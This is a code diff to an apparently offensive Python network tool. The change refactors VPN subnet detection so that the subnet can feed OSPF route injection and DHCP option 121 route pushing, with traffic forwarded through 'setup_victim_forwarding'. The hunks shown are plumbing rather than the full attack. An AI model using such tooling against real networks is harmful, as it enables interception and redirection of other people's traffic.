@@ -53,6 +53,7 @@ OVPN_BINARY_PATHS = [
 ]
 
 OVPN_PROFILE_DIRS = [
+    os.path.dirname(os.path.abspath(__file__)),  # same dir as this script
     os.path.expanduser("~/.config/OpenVPN Connect/profiles"),
     "/etc/openvpn",
     "/etc/openvpn/client",
@@ -299,27 +300,46 @@ def setup_victim_forwarding(phys_iface, tun_iface, vpn_subnets):
     print_step("OK", f"Forwarding installed: {phys_iface} → {tun_iface} for {vpn_subnets}")
 
 
-# ── High-level entry point ────────────────────────────────────────────────────
+# ── High-level entry points ───────────────────────────────────────────────────
 
-def enable_vpn_relay(server_details, phys_iface):
+def detect_vpn_subnet():
+    """Detect or start the VPN and return (tun_iface, vpn_net24) or (None, None).
+
+    Called early — before launching the OSPF adjacency engine — so the VPN
+    subnet can be included in OSPF route injection.  Does NOT configure
+    iptables or option 121; call enable_vpn_relay() for that.
     """
-    Detect/start the VPN, configure option 121, and install forwarding.
+    tun = start_openvpn_if_needed()
+    if not tun:
+        return None, None
+    vpn_net24 = get_tun_net24(tun)
+    if not vpn_net24:
+        print_step("SKIP", "VPN up but could not derive /24 — will use passthrough")
+        return tun, None
+    return tun, vpn_net24
 
-    Returns the tun interface name if selective relay is active, else None
-    (passthrough mode).  Registers cleanup on first successful setup.
+
+def enable_vpn_relay(server_details, phys_iface, tun=None, vpn_net24=None):
+    """Configure option 121 and install iptables forwarding for the VPN relay.
+
+    If tun/vpn_net24 are supplied (pre-detected by detect_vpn_subnet), they are
+    used directly so VPN detection is not repeated.  Otherwise detection runs now.
+
+    Returns the tun interface name if selective relay is active, else None.
+    Registers cleanup on first successful setup.
     """
     _register_cleanup()
 
-    tun = start_openvpn_if_needed()
-    if not tun:
-        configure_passthrough(server_details)
-        return None
-
-    vpn_net24 = get_tun_net24(tun)
-    if not vpn_net24:
-        print_step("SKIP", "VPN up but could not derive /24 subnet — passthrough only")
-        configure_passthrough(server_details)
-        return None
+    if tun is None or vpn_net24 is None:
+        tun = start_openvpn_if_needed()
+        if not tun:
+            configure_passthrough(server_details)
+            return None
+        vpn_net24 = get_tun_net24(tun)
+        if not vpn_net24:
+            print_step("SKIP", "VPN up but could not derive /24 subnet — passthrough only")
+            configure_passthrough(server_details)
+            return None
 
     configure_selective_relay(server_details, [vpn_net24])
     setup_victim_forwarding(phys_iface, tun, [vpn_net24])
